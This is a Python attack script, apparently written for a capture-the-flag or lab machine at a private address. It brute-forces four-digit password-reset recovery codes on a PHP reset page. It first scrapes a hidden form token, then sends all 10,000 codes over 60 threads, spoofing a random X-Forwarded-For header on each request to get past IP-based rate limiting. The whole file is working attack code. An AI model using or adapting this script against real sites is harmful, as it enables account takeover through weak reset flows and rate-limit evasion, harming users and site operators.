import requests
import random
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

# ================================
# USER CONFIGURATION
# ================================
ip = "10.10.46.106"
port = "1337"
phpsessid = "qv40uaabb5cpig354rg1adjvof"

BASE_URL = f"http://{ip}:{port}/reset_password.php"

# Common headers
BASE_HEADERS = {
    "Host": f"{ip}:{port}",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "keep-alive",
    "Referer": BASE_URL,
    "Cookie": f"PHPSESSID={phpsessid}"
}

# ================================
# EXTRACT HIDDEN FIELD 's'
# ================================
def extract_hidden_s():
    print("[*] Fetching hidden field 's'...")
    r = requests.get(BASE_URL, headers=BASE_HEADERS)
    match = re.search(r'name="s" value="(\d+)"', r.text)
    if not match:
        raise Exception("[-] Could not find hidden field 's'. Session likely invalid.")
    print(f"[+] Found s = {match.group(1)}")
    return match.group(1)

# ================================
# SEND BRUTE-FORCE REQUEST
# ================================
class Found(Exception):
    pass

def send_code(code, s_value):
    headers = BASE_HEADERS.copy()
    headers["X-Forwarded-For"] = ".".join(str(random.randint(1, 255)) for _ in range(4))

    data = {
        "recovery_code": code,
        "s": s_value
    }

    try:
        r = requests.post(BASE_URL, headers=headers, data=data, timeout=2)

        if "Invalid or expired recovery code!" not in r.text:
            print(f"\n🎉 SUCCESS! Correct code: {code}")
            raise Found

    except requests.RequestException:
        pass

# ================================
# MAIN BRUTE-FORCE EXECUTION
# ================================
def main():
    s_value = extract_hidden_s()
    print("[*] Starting brute force...")

    try:
        with ThreadPoolExecutor(max_workers=60) as exec:
            futures = {
                exec.submit(send_code, f"{i:04}", s_value): i
                for i in range(10000)
            }

            for f in as_completed(futures):
                try:
                    f.result()
                except Found:
                    print("[+] Stopping all threads.")
                    exec.shutdown(wait=False)
                    return

    except KeyboardInterrupt:
        print("\n[-] Interrupted by user.")

if __name__ == "__main__":
    main()
